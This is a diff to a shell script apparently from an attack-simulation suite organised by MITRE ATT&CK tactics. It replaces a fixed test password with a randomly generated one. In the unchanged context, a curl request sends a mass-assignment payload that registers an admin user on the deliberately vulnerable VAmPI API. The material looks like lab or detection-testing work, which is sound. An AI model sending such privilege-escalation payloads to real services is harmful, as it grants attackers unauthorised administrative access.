@@ -8,6 +8,7 @@ set -uo pipefail
 TARGET="${1:?Usage: 07-impact.sh <TARGET_FQDN>}"
 BASE="${TARGET_PROTOCOL:-http}://${TARGET}"
 MARKER="${TGEN_FAMILY_MARKER:?Run through the native mixed-family journal}"
+SYNTHETIC_PASSWORD=$(python3 -c 'import secrets; print(secrets.token_hex(16))')
 
 echo "[*] MITRE ATT&CK TA0040: Impact against ${TARGET}"
 echo ""
@@ -77,7 +78,7 @@ echo "  [T1565.b] VAmPI mass assignment (privilege escalation):"
 ts=$(date +%s)
 curl -sf -X POST "${BASE}/vampi/users/v1/register" \
   -H "Content-Type: application/json" \
-  -d "{\"username\":\"${MARKER}\",\"password\":\"test123\",\"email\":\"${MARKER}@example.com\",\"admin\":true,\"role\":\"admin\"}" \
+  -d "{\"username\":\"${MARKER}\",\"password\":\"${SYNTHETIC_PASSWORD}\",\"email\":\"${MARKER}@example.com\",\"admin\":true,\"role\":\"admin\"}" \
   --max-time 10 2>/dev/null | jq -c '.' 2>/dev/null
 echo ""
 
